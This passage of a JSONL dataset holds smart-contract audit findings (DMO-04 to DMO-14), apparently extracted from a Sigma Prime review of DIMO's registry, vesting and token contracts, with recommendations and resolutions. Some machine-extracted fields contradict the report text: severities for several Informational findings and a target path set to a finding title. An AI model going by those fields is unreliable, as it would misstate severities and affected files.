called, when in fact it is another.\n\nThe risk increases as more modules are added and the complexity of the system grows.\n\n#### **Recommendations**\n\nThe development team might want to consider adding the DIMORegistry contract itself as a module, with all of its function signatures, simply to block potential collisions. If a tool such as hardhat is used to list all of a contract's selectors, then nothing will be missed.\n\nAlternatively, a require check could be added within \\_addModule with DIMORegistry 's function signatures. This would be more reliable as it could not be removed.\n\n#### **Resolution**\n\nThe testing team acknowledges that original issues regarding shadowing with internal modules has been resolved. The team have implemented the recommendation by adding DIMORegistry contract itself as a module. The fix can be found in the following commit: [4ddf1402](https://github.com/DIMO-Network/dimoidentity/commit/4ddf1402e81bb5d0f6ddaabfbd2f296721010c23).\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": "DMO-04", "target": {"path": "DIMORegistry.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimoidentity", "org": "DIMO-Network", "name": "dimoidentity", "commit": "4ddf1402e81bb5d0f6ddaabfbd2f296721010c23", "branch": null, "relative_file": "DIMORegistry.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Finding ID": "DMO-04", "Target": "DIMORegistry.sol", "Status": "Resolved: See Resolution", "Asset": "DIMORegistry.sol", "Rating": "Severity: Medium"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-005", "doc_id": "sigmaprime_dimo_review", "finding_index": 5, "page_start": 10, "title": "Ownership Functionality Can Be Lost Through One Step Transfers", "short_summary": null, "description_md": "## **Description**\n\nDIMOVesting.sol inherits from OpenZeppelin's Ownable . There are two potential issues in this contract which can allow ownership to be lost entirely:\n\n- 1. As ownership transfer in transferOwnership() is unilateral, ownership can be accidentally transferred to an uncontrolled address.\n- 2. An accidental call to renounceOwnership() transfers ownership to the zero address, effectively destroying all ownership functionality permanently.\n", "full_markdown": "| DMO-05 | Ownership Functionality Can Be Lost Through One Step Transfers |             |                 |\n|--------|----------------------------------------------------------------|-------------|-----------------|\n| Asset  | DIMOVesting.sol                                                |             |                 |\n| Status | Resolved: See Resolution                                       |             |                 |\n| Rating | Severity: Low                                                  | Impact: Low | Likelihood: Low |\n\n## **Description**\n\nDIMOVesting.sol inherits from OpenZeppelin's Ownable . There are two potential issues in this contract which can allow ownership to be lost entirely:\n\n- 1. As ownership transfer in transferOwnership() is unilateral, ownership can be accidentally transferred to an uncontrolled address.\n- 2. An accidental call to renounceOwnership() transfers ownership to the zero address, effectively destroying all ownership functionality permanently.\n\n#### **Recommendations**\n\nChange ownership transfer to a propose/accept model and block or remove the renounceOwnership() function.\n\nOne convenient way to do this is to replace OpenZeppelin's Ownable with Chainlink's [ConfirmedOwnerWithProposal](https://github.com/smartcontractkit/chainlink/blob/develop/contracts/src/v0.8/ConfirmedOwnerWithProposal.sol)\n\n#### **Resolution**\n\nThe issue has been fixed in [commit d13151c2.](https://github.com/DIMO-Network/DIMO-vesting/pull/1/commits/d13151c2263c8d2dedd7bbca0aa496a98fc9ecad) Chainlink's ConfirmedOwnerWithProposal was used to allow for a propose-accept pattern for owner transfers.\n", "severity": "Low", "difficulty": "High", "type": null, "finding_id": "DMO-05", "target": {"path": "DIMOVesting.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimoidentity", "org": "DIMO-Network", "name": "dimoidentity", "commit": "4ddf1402e81bb5d0f6ddaabfbd2f296721010c23", "branch": null, "relative_file": "DIMOVesting.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "High", "Finding ID": "DMO-05", "Target": "DIMOVesting.sol", "Status": "Resolved: See Resolution", "Asset": "DIMOVesting.sol", "Rating": "Severity: Low"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-006", "doc_id": "sigmaprime_dimo_review", "finding_index": 6, "page_start": 11, "title": "Ineffective Vesting Transfer Mechanism", "short_summary": null, "description_md": "## **Description**\n\nThe DIMOVesting contract expects transfers to be made before creating a vesting schedule using createVestingSchedule() . As a result, there are checks to ensure that funds are sufficient.\n\nHowever, if a user accidentally transfers funds to the vesting contract and the owner creates the vesting schedule without transferring, this will lock funds that did not belong to the owner.\n\nReversing this process is unnecessarily challenging. The owner will need to revoke the schedule, transfer the funds back to the user and then transfer new funds to the vesting schedule, whilst accounting for any potentially released funds, then creating the vesting schedule again.\n\nThis lengthy correction process is unnecessary and introduces potential for human error.\n", "full_markdown": "| DMO-06 | Ineffective Vesting Transfer Mechanism |  |\n|--------|----------------------------------------|--|\n| Asset  | DIMOVesting.sol                        |  |\n| Status | Closed: See Resolution                 |  |\n| Rating | Informational                          |  |\n\n## **Description**\n\nThe DIMOVesting contract expects transfers to be made before creating a vesting schedule using createVestingSchedule() . As a result, there are checks to ensure that funds are sufficient.\n\nHowever, if a user accidentally transfers funds to the vesting contract and the owner creates the vesting schedule without transferring, this will lock funds that did not belong to the owner.\n\nReversing this process is unnecessarily challenging. The owner will need to revoke the schedule, transfer the funds back to the user and then transfer new funds to the vesting schedule, whilst accounting for any potentially released funds, then creating the vesting schedule again.\n\nThis lengthy correction process is unnecessary and introduces potential for human error.\n\n## **Recommendations**\n\nEnsure this behaviour is understood, if this behaviour isn't intentional consider forcing the user to transfer funds when they interact with createVestingSchedule\n\n## **Resolution**\n\nThe development team indicated that \"the behavior is understood and intended\" as shown in [PR#1.](https://github.com/DIMO-Network/DIMO-vesting/pull/1)\n", "severity": "High", "difficulty": "High", "type": null, "finding_id": "DMO-06", "target": {"path": "DIMOVesting.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimoidentity", "org": "DIMO-Network", "name": "dimoidentity", "commit": "4ddf1402e81bb5d0f6ddaabfbd2f296721010c23", "branch": null, "relative_file": "DIMOVesting.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "High", "Finding ID": "DMO-06", "Target": "DIMOVesting.sol", "Status": "Closed: See Resolution", "Asset": "DIMOVesting.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-007", "doc_id": "sigmaprime_dimo_review", "finding_index": 7, "page_start": 12, "title": "Token Upgradeability May Lead to Denial-of-Service", "short_summary": null, "description_md": "## **Description**\n\nThe Dimo token uses the EIP-1967 transparent proxy pattern to allow upgradeability, as has been used to upgrade from version 1. Whilst upgradeability adds flexibility, its downside is potential uncertainty: any upgradeable contract can be modified to any functionality.\n\nFor many contracts, the flexibility advantages are regarded as balancing the risks of upgradeability. In the case of tokens, however, as the functionality is simple, well established, and successfully implemented in many other instances, upgradeability is often viewed as an unacceptable risk by users.\n", "full_markdown": "| DMO-07 | Token Upgradeability May Lead to Denial-of-Service |  |  |\n|--------|----------------------------------------------------|--|--|\n| Asset  | DimoV2.sol                                         |  |  |\n| Status | Closed: See Resolution                             |  |  |\n| Rating | Informational                                      |  |  |\n\n## **Description**\n\nThe Dimo token uses the EIP-1967 transparent proxy pattern to allow upgradeability, as has been used to upgrade from version 1. Whilst upgradeability adds flexibility, its downside is potential uncertainty: any upgradeable contract can be modified to any functionality.\n\nFor many contracts, the flexibility advantages are regarded as balancing the risks of upgradeability. In the case of tokens, however, as the functionality is simple, well established, and successfully implemented in many other instances, upgradeability is often viewed as an unacceptable risk by users.\n\n#### **Recommendations**\n\nBe aware of the potential and perceived potential for the token contract's proxy admin to do anything it wants to the token supply.\n\nUnfortunately, the only way to convert an upgradeable proxy token to a standard token is to create a new contract and allow the tokens to be swapped for each other.\n\nNevertheless, transitioning to a static contract for a token is recommended for the benefits in stability and reliability it would provide.\n\n#### **Resolution**\n\nThe development team indicated that \"the behavior is understood\" and that \"token upgradability is likely to be temporary\". These comments can be found in [PR#2.](https://github.com/DIMO-Network/dimo-token/pull/2)\n", "severity": "Informational", "difficulty": "High", "type": null, "finding_id": "DMO-07", "target": {"path": "DimoV2.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimoidentity", "org": "DIMO-Network", "name": "dimoidentity", "commit": "4ddf1402e81bb5d0f6ddaabfbd2f296721010c23", "branch": null, "relative_file": "DimoV2.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Finding ID": "DMO-07", "Target": "DimoV2.sol", "Status": "Closed: See Resolution", "Asset": "DimoV2.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-008", "doc_id": "sigmaprime_dimo_review", "finding_index": 8, "page_start": 13, "title": "No initialize() Function on Proxy Implementation", "short_summary": null, "description_md": "## **Description**\n\nAn initialize() function in a proxy implementation is used to set the initial values within the storage space of the proxy contract. DimoV2 lacks such a function, and the reason for that seems to be that these values were already set within the first version of the Dimo token contract.\n\nSo long as the contract DimoV2 is only used to upgrade from a successfully initialised first version Dimo token contract, this does not cause any problems. However, if any token were ever deployed with DimoV2 as its first implementation contact, it would lack the values set in its initialize() function.\n", "full_markdown": "| DMO-08 | No initialize() Function on Proxy Implementation |  |\n|--------|--------------------------------------------------|--|\n| Asset  | DimoV2.sol                                       |  |\n| Status | Resolved: See Resolution                         |  |\n| Rating | Informational                                    |  |\n\n## **Description**\n\nAn initialize() function in a proxy implementation is used to set the initial values within the storage space of the proxy contract. DimoV2 lacks such a function, and the reason for that seems to be that these values were already set within the first version of the Dimo token contract.\n\nSo long as the contract DimoV2 is only used to upgrade from a successfully initialised first version Dimo token contract, this does not cause any problems. However, if any token were ever deployed with DimoV2 as its first implementation contact, it would lack the values set in its initialize() function.\n\n## **Recommendations**\n\nThe team should acknowledge the issue and remain aware of it should they ever wish to deploy DimoV2 . Alternatively, DimoV2 could have an initialize() function added.\n\n#### **Resolution**\n\nThe development team indicated that \"the behavior is understood\" as seen in [PR#2.](https://github.com/DIMO-Network/dimo-token/pull/2) The reason to not have an initialize() function is that all variables were already initialized in the first version.\n", "severity": "Low", "difficulty": "Low", "type": null, "finding_id": "DMO-08", "target": {"path": "DimoV2.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimoidentity", "org": "DIMO-Network", "name": "dimoidentity", "commit": "4ddf1402e81bb5d0f6ddaabfbd2f296721010c23", "branch": null, "relative_file": "DimoV2.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Finding ID": "DMO-08", "Target": "DimoV2.sol", "Status": "Resolved: See Resolution", "Asset": "DimoV2.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-009", "doc_id": "sigmaprime_dimo_review", "finding_index": 9, "page_start": 14, "title": "Potentially Unsafe Use of delegatecall() Opcode", "short_summary": null, "description_md": "## **Description**\n\nThe functionality of DIMORegistry relies on delegatecall . However, this design decision may present significant risks in the future.\n\nIndeed, any module that is added to DIMORegistry can potentially access and modify any part of the storage of DIMORegistry . That means it can grant any role, change any token allocation, or add other modules. The greatest danger is that a module is added which in some way ends up making a call to selfdestruct . This would cause DIMORegistry itself to delete its own code and result in a denial of service for any dependency contracts.\n", "full_markdown": "| DMO-09 | Potentially Unsafe Use of delegatecall() Opcode |  |\n|--------|-------------------------------------------------|--|\n| Asset  | DIMORegistry.sol                                |  |\n| Status | Closed: See Resolution                          |  |\n| Rating | Informational                                   |  |\n\n## **Description**\n\nThe functionality of DIMORegistry relies on delegatecall . However, this design decision may present significant risks in the future.\n\nIndeed, any module that is added to DIMORegistry can potentially access and modify any part of the storage of DIMORegistry . That means it can grant any role, change any token allocation, or add other modules. The greatest danger is that a module is added which in some way ends up making a call to selfdestruct . This would cause DIMORegistry itself to delete its own code and result in a denial of service for any dependency contracts.\n\n#### **Recommendations**\n\nAfter discussion with the development team, and careful evaluation of the design, the testing team acknowledges this issue as an informational. Notwithstanding the informational status of this finding, the development team should place a high priority on ensuring that all modules added to DIMORegistry are reviewed for security. These reviews should not be performed in isolation, but rather ensure that the interactions with other existing modules are sound. Specific weight should be placed on ensuring storage collisions do not occur.\n\n#### **Resolution**\n\nThe development team indicated that \"the behavior is understood\" as shown in [PR#25.](https://github.com/DIMO-Network/dimo-identity/pull/25) They intend to conduct a security review on all modules added to the system.\n", "severity": "Medium", "difficulty": "High", "type": null, "finding_id": "DMO-09", "target": {"path": "DIMORegistry.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimoidentity", "org": "DIMO-Network", "name": "dimoidentity", "commit": "4ddf1402e81bb5d0f6ddaabfbd2f296721010c23", "branch": null, "relative_file": "DIMORegistry.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Finding ID": "DMO-09", "Target": "DIMORegistry.sol", "Status": "Closed: See Resolution", "Asset": "DIMORegistry.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-010", "doc_id": "sigmaprime_dimo_review", "finding_index": 10, "page_start": 15, "title": "Ineffective Function Signature Registry Change Process", "short_summary": null, "description_md": "## **Description**\n\nBecause of the check on line [**129**] of DIMORegistry.sol , it is not possible to add additional selectors from an implementation contract once any selectors at all have been added. This is because selectorsHash[implementation] will be set on module addition at line [**141**] and this value is never modified.\n\nThis may be present a risk if an implementation contract is removed, and then the protocol wishes to add it back to the registry again, or if the protocol wishes to add more function signatures from an already registered implementation contract.\n\nIn either case, the implementation contract in question would need to be redeployed.\n", "full_markdown": "| DMO-10 | Ineffective Function Signature Registry Change Process |  |  |\n|--------|--------------------------------------------------------|--|--|\n| Asset  | DIMORegistry.sol                                       |  |  |\n| Status | Resolved: See Resolution                               |  |  |\n| Rating | Informational                                          |  |  |\n\n## **Description**\n\nBecause of the check on line [**129**] of DIMORegistry.sol , it is not possible to add additional selectors from an implementation contract once any selectors at all have been added. This is because selectorsHash[implementation] will be set on module addition at line [**141**] and this value is never modified.\n\nThis may be present a risk if an implementation contract is removed, and then the protocol wishes to add it back to the registry again, or if the protocol wishes to add more function signatures from an already registered implementation contract.\n\nIn either case, the implementation contract in question would need to be redeployed.\n\n## **Recommendations**\n\nMake sure this behaviour is understood and expected.\n\nThe development team may want to consider adding s.selectorsHash[implementation] = 0x0 at line [**165**], at the end of \\_removeModule() , so that once a module has been removed, it could be added back if desired.\n\n# **Resolution**\n\nThe development team indicated that \"the behavior is understood and expected\" as shown in [PR#25.](https://github.com/DIMO-Network/dimo-identity/pull/25) However, they also implemented requested changes [here.](https://github.com/DIMO-Network/dimo-identity/commit/744a2415da3a6ed5b74b3fc31cee5a35434e9681) Modules can now be added back to the system after removal.\n", "severity": "Low", "difficulty": "Low", "type": null, "finding_id": "DMO-10", "target": {"path": "DIMORegistry.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-identity", "org": "DIMO-Network", "name": "dimo-identity", "commit": "744a2415da3a6ed5b74b3fc31cee5a35434e9681", "branch": null, "relative_file": "DIMORegistry.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Low", "Finding ID": "DMO-10", "Target": "DIMORegistry.sol", "Status": "Resolved: See Resolution", "Asset": "DIMORegistry.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-011", "doc_id": "sigmaprime_dimo_review", "finding_index": 11, "page_start": 16, "title": "fallback Function Could Potentially Cause Unintended Side-Effects", "short_summary": null, "description_md": "## **Description**\n\nThe \\_addModule() function will add any function signature, even if it is not present on a module contract. If a module contract is added which contains a fallback function, that is what will be called when the nonexistant function signature is called on the registry contract.\n\nThere is no particular exploit scenario present in the current contracts, but this does suggest itself as either a way to hide attack code, or a possible unexpected scenario that might result from a deployment error (if a function signature is entered incorrectly, for example).\n", "full_markdown": "| DMO-11 | fallback Function Could Potentially Cause Unintended Side-Effects |  |  |\n|--------|-------------------------------------------------------------------|--|--|\n| Asset  | DIMORegistry.sol                                                  |  |  |\n| Status | Resolved: See Resolution                                          |  |  |\n| Rating | Informational                                                     |  |  |\n\n## **Description**\n\nThe \\_addModule() function will add any function signature, even if it is not present on a module contract. If a module contract is added which contains a fallback function, that is what will be called when the nonexistant function signature is called on the registry contract.\n\nThere is no particular exploit scenario present in the current contracts, but this does suggest itself as either a way to hide attack code, or a possible unexpected scenario that might result from a deployment error (if a function signature is entered incorrectly, for example).\n\n## **Recommendations**\n\nBe aware of this issue and avoid module contracts that implement a fallback .\n\n#### **Resolution**\n\nThe development team indicated that \"the behavior is understood\" as shown in [PR#25.](https://github.com/DIMO-Network/dimo-identity/pull/25) They intend to conduct a security review on all modules added to the system. In doing so they will ensure no fallback functions are present in added modules.\n", "severity": "Low", "difficulty": "High", "type": null, "finding_id": "DMO-11", "target": {"path": "fallback Function Could Potentially Cause Unintended Side-Effects", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-identity", "org": "DIMO-Network", "name": "dimo-identity", "commit": "744a2415da3a6ed5b74b3fc31cee5a35434e9681", "branch": null, "relative_file": "fallback Function Could Potentially Cause Unintended Side-Effects", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "High", "Finding ID": "DMO-11", "Target": "fallback Function Could Potentially Cause Unintended Side-Effects", "Status": "Resolved: See Resolution", "Asset": "DIMORegistry.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-012", "doc_id": "sigmaprime_dimo_review", "finding_index": 12, "page_start": 17, "title": "Bypassable Limitations on NFT Minting", "short_summary": null, "description_md": "## **Description**\n\nRoot.mintRoot() contains a system based on the value s.controllers[\\_owner].rootMinted which only allows on root NFT to be minted to any given address. As clarified by the development team, the purpose of this check is to avoid one address holding multiple root NFTs.\n\nHowever, as the NFTs are transferable, it would be easy for their owners to move them around and place many on a single address. In effect, therefore, the restriction imposed by s.controllers[\\_owner].rootMinted only really limits the minting powers of DIMO.\n", "full_markdown": "| DMO-12 | Bypassable Limitations on NFT Minting |  |\n|--------|---------------------------------------|--|\n| Asset  | Root.sol                              |  |\n| Status | Resolved: See Resolution              |  |\n| Rating | Informational                         |  |\n\n## **Description**\n\nRoot.mintRoot() contains a system based on the value s.controllers[\\_owner].rootMinted which only allows on root NFT to be minted to any given address. As clarified by the development team, the purpose of this check is to avoid one address holding multiple root NFTs.\n\nHowever, as the NFTs are transferable, it would be easy for their owners to move them around and place many on a single address. In effect, therefore, the restriction imposed by s.controllers[\\_owner].rootMinted only really limits the minting powers of DIMO.\n\n#### **Recommendations**\n\nThe team may wish to make the NFTs non-transferable or transferable only by the DIMO team. It would be possible to modify the NFT contracts to cause a transfer to revert if the new owner already owns a root NFT.\n\nAlternatively, s.controllers[\\_owner].rootMinted and its associated checks and restrictions could simply be removed.\n\n#### **Resolution**\n\nThis issue was fixed in the following [commit #bc5efdf3.](https://github.com/DIMO-Network/dimo-identity/commit/bc5efdf39a514c003f86f1051d83fac516a170de) Token transfers are no longer possible.\n", "severity": "Informational", "difficulty": "High", "type": null, "finding_id": "DMO-12", "target": {"path": "Root.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-identity", "org": "DIMO-Network", "name": "dimo-identity", "commit": "744a2415da3a6ed5b74b3fc31cee5a35434e9681", "branch": null, "relative_file": "Root.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Finding ID": "DMO-12", "Target": "Root.sol", "Status": "Resolved: See Resolution", "Asset": "Root.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-013", "doc_id": "sigmaprime_dimo_review", "finding_index": 13, "page_start": 18, "title": "Releasable Funds Can Be Revoked", "short_summary": null, "description_md": "#### **Description**\n\nThe DIMOVesting contract handles vesting of tokens in order to guarantee release after a certain period of time has expired. Tokens can be released after the cliff period, with all tokens becoming redeemable after the vesting duration has expired.\n\nVesting contracts are generally transparent contracts that handle how funds are released and when. However, Dimo reserves the ability to revoke() vesting positions at any time. In some circumstances revoking is necessary, however, if users already have a redeemable amount of tokens, the owner of the vesting contract can revoke the redeemable amount.\n\nThe contract will only validate the total previously released amount, and any unreleased amount will also be sent back to the vesting owner . This logic is described in the code snippet below:\n\n```\nuint256 unreleased = vestingSchedule.amountTotal -\nvestingSchedule.released;\n    if (unreleased > 0) {\n        _token.safeTransfer(owner(), unreleased);\n    }\n```\n", "full_markdown": "| DMO-13 | Releasable Funds Can Be Revoked |\n|--------|---------------------------------|\n| Asset  | DIMOVesting.sol                 |\n| Status | Closed: See Resolution          |\n| Rating | Informational                   |\n\n#### **Description**\n\nThe DIMOVesting contract handles vesting of tokens in order to guarantee release after a certain period of time has expired. Tokens can be released after the cliff period, with all tokens becoming redeemable after the vesting duration has expired.\n\nVesting contracts are generally transparent contracts that handle how funds are released and when. However, Dimo reserves the ability to revoke() vesting positions at any time. In some circumstances revoking is necessary, however, if users already have a redeemable amount of tokens, the owner of the vesting contract can revoke the redeemable amount.\n\nThe contract will only validate the total previously released amount, and any unreleased amount will also be sent back to the vesting owner . This logic is described in the code snippet below:\n\n```\nuint256 unreleased = vestingSchedule.amountTotal -\nvestingSchedule.released;\n    if (unreleased > 0) {\n        _token.safeTransfer(owner(), unreleased);\n    }\n```\n\n#### **Recommendations**\n\nMake sure this behaviour is understood and intended, and consider mentioning this explicitly in any relevant documentation.\n\nIf this behaviour is not intended, modification of DIMOVesting might include calculations of releasable token amounts and excluding these from the unreleased variable on line [**100**].\n\n#### **Resolution**\n\nThe development team indicated that \"the behavior is understood and intended\" as shown in [PR#1.](https://github.com/DIMO-Network/DIMO-vesting/pull/1)\n", "severity": "Informational", "difficulty": "High", "type": null, "finding_id": "DMO-13", "target": {"path": "DIMOVesting.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/DIMO-Network/dimo-identity", "org": "DIMO-Network", "name": "dimo-identity", "commit": "744a2415da3a6ed5b74b3fc31cee5a35434e9681", "branch": null, "relative_file": "DIMOVesting.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:08:58.148548+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:08:58.151424+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Finding ID": "DMO-13", "Target": "DIMOVesting.sol", "Status": "Closed: See Resolution", "Asset": "DIMOVesting.sol", "Rating": "Informational"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_dimo_review-014", "doc_id": "sigmaprime_dimo_review", "finding_index": 14, "page_start": 19, "title": "Possible Reentrancy by Permissioned owner Account", "short_summary": null, "description_md": "#### **Description**\n\nThe token transfer on line [**103**] of DIMOVesting.sol is an external call. If owner can regain execution control during that call, they could potentially call revoke() for the same vest and keep draining out tokens.\n\nThe impact of this issue is mitigated heavily by [DMO-13,](#page-18-0) which already gives owner the ability to withdraw all the tokens in the vesting contract by calling revoke on all open vests. This issue would become a lot more significant if that issue were resolved.\n", "full_markdown": "| DMO-14 | Possible Reentrancy by Permissioned owner Account |\n|--------|---------------------------------------------------|\n| Asset  | DIMOVesting.sol                                   |\n| Status | Resolved: See Resolution                          |\n| Rating | Informational                                     |\n\n#### **Description**\n\nThe token transfer on line [**103**] of DIMOVesting.sol is an external call. If owner can regain execution control during that call, they could potentially call revoke() for the same vest and keep draining out tokens.\n\nThe impact of this issue is mitigated heavily by [DMO-13,](#page-18-0) which already gives owner the ability to withdraw all the tokens in the vesting contract by calling revoke on all open vests. This issue would become a lot more significant if that issue were resolved.\n\n#### **Recommendations**\n\nConsider moving the token transfer to the end of the revoke() function, after all the state variable updates.\n\n#### **Resolution**\n\nThe issue has been fixed in [commit 6a04cbf8.](https://github.com/DIMO-Network/DIMO-vesting/commit/6a04cbf8b2af74d8be58b32a2710df68ddb7aa04) Check-effects pattern was implemented, preventing re-entrancy from impacting accountancy variables.\n", "severity": "High", "difficulty": "High", "type": null, "finding_id": "DMO-14", "target": {"path": "DIMOVesting.sol", "language": 